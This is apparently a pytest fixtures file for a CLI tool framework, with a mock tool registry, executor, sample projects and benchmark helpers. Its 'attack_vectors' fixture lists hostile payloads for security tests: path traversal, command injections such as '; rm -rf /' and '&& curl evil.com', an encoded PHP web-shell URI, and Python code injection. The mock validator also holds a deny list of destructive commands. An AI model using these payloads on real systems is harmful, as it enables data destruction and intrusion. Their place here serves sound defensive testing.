"""
Shared fixtures for CLI tools testing.

This module provides reusable fixtures for testing all tool categories:
- Tool registry and executor fixtures
- Safety validator fixtures
- Temporary project structures
- Sample files for testing
- Performance measurement utilities
"""

import pytest
import json
import time
from pathlib import Path
from typing import Dict, Any, List
from dataclasses import dataclass


# ============================================================================
# Core Tool Infrastructure Fixtures
# ============================================================================

@pytest.fixture
def tool_registry():
    """
    Fresh tool registry for each test.

    Ensures test isolation by providing a clean registry instance.
    """
    # NOTE: Once ToolRegistry is implemented, import and instantiate here
    # from promptchain.cli.tools.registry import ToolRegistry
    # return ToolRegistry()

    # Placeholder for development
    class MockToolRegistry:
        def __init__(self):
            self.tools = {}

        def register(self, category: str, description: str, parameters: Dict[str, Any]):
            def decorator(func):
                self.tools[func.__name__] = {
                    "function": func,
                    "name": func.__name__,
                    "category": category,
                    "description": description,
                    "parameters": parameters
                }
                return func
            return decorator

        def get(self, name: str):
            return self.tools.get(name)

        def list_tools(self, category: str = None) -> List[str]:
            if category:
                return [n for n, t in self.tools.items() if t["category"] == category]
            return list(self.tools.keys())

    return MockToolRegistry()


@pytest.fixture
def tool_executor(tool_registry):
    """
    Tool executor configured with registry.

    Provides execution environment for testing tool invocation.
    """
    # NOTE: Once ToolExecutor is implemented, import and instantiate here
    # from promptchain.cli.tools.executor import ToolExecutor
    # return ToolExecutor(tool_registry)

    # Placeholder for development
    class MockToolExecutor:
        def __init__(self, registry):
            self.registry = registry

        def execute(self, tool_name: str, **kwargs):
            tool = self.registry.get(tool_name)
            if not tool:
                raise ValueError(f"Tool not found: {tool_name}")

            result = tool["function"](**kwargs)

            @dataclass
            class ExecutionResult:
                success: bool = True
                result: Any = None
                error: str = None
                execution_time_ms: float = 0.0

            return ExecutionResult(success=True, result=result)

    return MockToolExecutor(tool_registry)


@pytest.fixture
def safety_validator(tmp_path):
    """
    Safety validator with temporary project root.

    Configured for safe testing with isolated file system access.

    Args:
        tmp_path: pytest's temporary directory fixture
    """
    # NOTE: Once SafetyValidator is implemented, import and instantiate here
    # from promptchain.cli.tools.safety import SafetyValidator
    # return SafetyValidator(project_root=tmp_path, safe_mode=True)

    # Placeholder for development
    class MockSafetyValidator:
        def __init__(self, project_root: Path, safe_mode: bool = True):
            self.project_root = project_root
            self.safe_mode = safe_mode

        def validate_path(self, path: str) -> Path:
            """Validate path is within project root."""
            resolved = Path(path).resolve()
            if not str(resolved).startswith(str(self.project_root)):
                raise SecurityError(f"Path outside project root: {path}")
            return resolved

        def validate_command(self, command: str) -> bool:
            """Validate command is safe to execute."""
            dangerous = ["rm -rf", "dd if=", "mkfs", "> /dev/"]
            return not any(d in command for d in dangerous)

    class SecurityError(Exception):
        pass

    return MockSafetyValidator(project_root=tmp_path, safe_mode=True)


# ============================================================================
# Project Structure Fixtures
# ============================================================================

@pytest.fixture
def temp_project(tmp_path):
    """
    Create temporary project structure for testing.

    Creates a realistic project layout with:
    - Source code directory (src/)
    - Test directory (tests/)
    - Documentation (README.md)
    - Configuration files
    - Git repository (optional)

    Returns:
        Path: Root directory of temporary project
    """
    project_root = tmp_path / "test_project"
    project_root.mkdir()

    # Create source directory
    src_dir = project_root / "src"
    src_dir.mkdir()
    (src_dir / "__init__.py").write_text("")
    (src_dir / "main.py").write_text("""
def main():
    '''Main entry point.'''
    print("Hello, World!")

if __name__ == "__main__":
    main()
""")

    # Create tests directory
    tests_dir = project_root / "tests"
    tests_dir.mkdir()
    (tests_dir / "__init__.py").write_text("")
    (tests_dir / "test_main.py").write_text("""
import pytest
from src.main import main

def test_main(capsys):
    '''Test main function.'''
    main()
    captured = capsys.readouterr()
    assert "Hello, World!" in captured.out
""")

    # Create documentation
    (project_root / "README.md").write_text("""# Test Project

A sample project for testing tools.

## Features
- Feature 1
- Feature 2
""")

    # Create configuration
    (project_root / "config.json").write_text(json.dumps({
        "version": "1.0.0",
        "name": "test-project"
    }, indent=2))

    return project_root


@pytest.fixture
def sample_files(temp_project):
    """
    Create diverse sample files for testing.

    Provides files of different types:
    - Python source code with classes, functions, and docstrings
    - Plain text files
    - JSON configuration files
    - Markdown documentation
    - Binary-like files (simulated)

    Returns:
        Dict[str, Path]: Mapping of file types to paths
    """
    files = {}

    # Python file with rich content
    files["python"] = temp_project / "src" / "example.py"
    files["python"].write_text("""
'''Example module for testing.'''

from typing import List, Optional

def hello(name: str) -> str:
    '''
    Say hello to someone.

    Args:
        name: Person's name

    Returns:
        Greeting message
    '''
    return f"Hello, {name}!"

def add_numbers(a: int, b: int) -> int:
    '''Add two numbers together.'''
    return a + b

class Greeter:
    '''A class for greeting people.'''

    def __init__(self, prefix: str = "Hello"):
        '''
        Initialize greeter.

        Args:
            prefix: Greeting prefix
        '''
        self.prefix = prefix

    def greet(self, name: str) -> str:
        '''Greet someone with configured prefix.'''
        return f"{self.prefix}, {name}!"

    def greet_many(self, names: List[str]) -> List[str]:
        '''Greet multiple people.'''
        return [self.greet(name) for name in names]

class CustomError(Exception):
    '''Custom error for testing.'''
    pass
""")

    # Text file
    files["text"] = temp_project / "data.txt"
    files["text"].write_text("""Sample text content
Line 2 with important data
Line 3 with TODO: fix this
Line 4 with FIXME: refactor
Final line""")

    # JSON configuration
    files["config"] = temp_project / "config.json"
    files["config"].write_text(json.dumps({
        "app_name": "TestApp",
        "version": "1.2.3",
        "features": {
            "auth": True,
            "logging": True,
            "cache": False
        },
        "limits": {
            "max_users": 1000,
            "timeout_seconds": 30
        }
    }, indent=2))

    # Markdown documentation
    files["markdown"] = temp_project / "DOCS.md"
    files["markdown"].write_text("""# Documentation

## Installation

```bash
pip install test-package
```

## Usage

```python
from test_package import hello
print(hello("World"))
```

## API Reference

### hello(name: str) -> str

Returns a greeting.
""")

    # Large file for performance testing
    files["large"] = temp_project / "large_file.txt"
    files["large"].write_text("\n".join([f"Line {i}" for i in range(10000)]))

    # Binary-like file (simulated)
    files["binary"] = temp_project / "data.bin"
    files["binary"].write_bytes(bytes(range(256)))

    return files


@pytest.fixture
def git_project(temp_project):
    """
    Create temporary project with Git repository.

    Initializes git and creates initial commit for testing Git tools.

    Returns:
        Path: Root directory with initialized git repo
    """
    import subprocess

    # Initialize git repo
    subprocess.run(
        ["git", "init"],
        cwd=temp_project,
        capture_output=True,
        check=True
    )

    # Configure git
    subprocess.run(
        ["git", "config", "user.email", "test@example.com"],
        cwd=temp_project,
        capture_output=True,
        check=True
    )
    subprocess.run(
        ["git", "config", "user.name", "Test User"],
        cwd=temp_project,
        capture_output=True,
        check=True
    )

    # Create initial commit
    subprocess.run(
        ["git", "add", "."],
        cwd=temp_project,
        capture_output=True,
        check=True
    )
    subprocess.run(
        ["git", "commit", "-m", "Initial commit"],
        cwd=temp_project,
        capture_output=True,
        check=True
    )

    return temp_project


# ============================================================================
# Performance Testing Fixtures
# ============================================================================

@pytest.fixture
def performance_timer():
    """
    High-resolution timer for performance testing.

    Usage:
        with performance_timer() as timer:
            # Code to measure
            pass
        assert timer.elapsed_ms < 100
    """
    class PerformanceTimer:
        def __init__(self):
            self.start_time = None
            self.end_time = None

        def __enter__(self):
            self.start_time = time.perf_counter()
            return self

        def __exit__(self, *args):
            self.end_time = time.perf_counter()

        @property
        def elapsed_ms(self) -> float:
            """Elapsed time in milliseconds."""
            if self.start_time and self.end_time:
                return (self.end_time - self.start_time) * 1000
            return 0.0

        @property
        def elapsed_us(self) -> float:
            """Elapsed time in microseconds."""
            return self.elapsed_ms * 1000

    return PerformanceTimer


@pytest.fixture
def benchmark_runner(performance_timer):
    """
    Run benchmarks with statistical analysis.

    Usage:
        results = benchmark_runner(lambda: my_function(), iterations=100)
        assert results.mean_ms < 50
        assert results.p95_ms < 100
    """
    def run_benchmark(func, iterations: int = 100):
        """Run function multiple times and collect statistics."""
        times = []

        for _ in range(iterations):
            with performance_timer() as timer:
                func()
            times.append(timer.elapsed_ms)

        times.sort()

        @dataclass
        class BenchmarkResults:
            iterations: int
            mean_ms: float
            median_ms: float
            min_ms: float
            max_ms: float
            p95_ms: float
            p99_ms: float

        return BenchmarkResults(
            iterations=iterations,
            mean_ms=sum(times) / len(times),
            median_ms=times[len(times) // 2],
            min_ms=min(times),
            max_ms=max(times),
            p95_ms=times[int(len(times) * 0.95)],
            p99_ms=times[int(len(times) * 0.99)]
        )

    return run_benchmark


# ============================================================================
# Security Testing Fixtures
# ============================================================================

@pytest.fixture
def attack_vectors():
    """
    Common attack vectors for security testing.

    Returns dictionary of attack categories with example payloads.
    """
    return {
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "file://etc/passwd",
            "./../sensitive.txt",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "`whoami`",
            "$(cat /etc/passwd)",
            "; DROP TABLE users;--",
        ],
        "file_inclusion": [
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "/proc/self/environ",
        ],
        "code_injection": [
            "__import__('os').system('whoami')",
            "eval('print(1)')",
            "exec('import os; os.system(\"ls\")')",
            "'; DROP TABLE users;--",
        ],
        "resource_exhaustion": [
            "../" * 1000,  # Deep path traversal
            "A" * 1000000,  # Large string
            range(1000000),  # Large iteration
        ],
    }


@pytest.fixture
def security_validator(safety_validator, attack_vectors):
    """
    Comprehensive security validator for testing.

    Wraps safety_validator with attack detection.
    """
    def validate_against_attacks(value: str, attack_category: str = None) -> bool:
        """
        Test if value contains attack patterns.

        Args:
            value: Input to validate
            attack_category: Specific category to test (optional)

        Returns:
            True if value appears safe, False if suspicious
        """
        categories = [attack_category] if attack_category else attack_vectors.keys()

        for category in categories:
            for attack in attack_vectors[category]:
                if isinstance(attack, str) and attack in str(value):
                    return False

        return True

    safety_validator.validate_against_attacks = validate_against_attacks
    return safety_validator


# ============================================================================
# Mock Tool Fixtures
# ============================================================================

@pytest.fixture
def mock_filesystem_tool(tool_registry, temp_project):
    """Register mock filesystem tools for testing."""

    @tool_registry.register(
        category="filesystem",
        description="Read file contents",
        parameters={"path": {"type": "string", "required": True}}
    )
    def fs_read(path: str) -> str:
        """Read file from temporary project."""
        file_path = temp_project / path
        return file_path.read_text()

    @tool_registry.register(
        category="filesystem",
        description="Write file contents",
        parameters={
            "path": {"type": "string", "required": True},
            "content": {"type": "string", "required": True}
        }
    )
    def fs_write(path: str, content: str) -> str:
        """Write file to temporary project."""
        file_path = temp_project / path
        file_path.parent.mkdir(parents=True, exist_ok=True)
        file_path.write_text(content)
        return f"Written {len(content)} bytes to {path}"

    return tool_registry


# ============================================================================
# Integration Testing Fixtures
# ============================================================================

@pytest.fixture
def integration_environment(temp_project, sample_files, tool_registry):
    """
    Complete integration testing environment.

    Provides:
    - Temporary project with sample files
    - Registered tools
    - Executor and safety validator

    Returns:
        Dict with all components for integration testing
    """
    # This will be expanded when actual tools are implemented
    return {
        "project_root": temp_project,
        "sample_files": sample_files,
        "registry": tool_registry,
    }
